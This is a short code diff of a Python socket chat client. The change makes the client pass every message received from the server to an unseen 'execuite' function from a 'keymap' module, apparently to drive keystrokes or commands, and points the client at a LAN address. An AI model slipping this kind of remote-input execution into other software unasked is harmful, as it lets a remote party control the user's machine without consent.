@@ -1,11 +1,12 @@
 import threading
 import socket
 from pynput.keyboard import Listener
+from keymap import execuite
 
 n=input("choose a nickname:")
 
 
-host = '127.0.0.1'  # localhost
+host = '192.168.1.6'  # localhost
 port = 55555
 
 c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,7 +19,7 @@ def re():
             if m=='nick':
                 c.send(n.encode('ascii'))
             else:
-                print(m)
+                execuite(m)
         except:
             print('error')
             c.close()
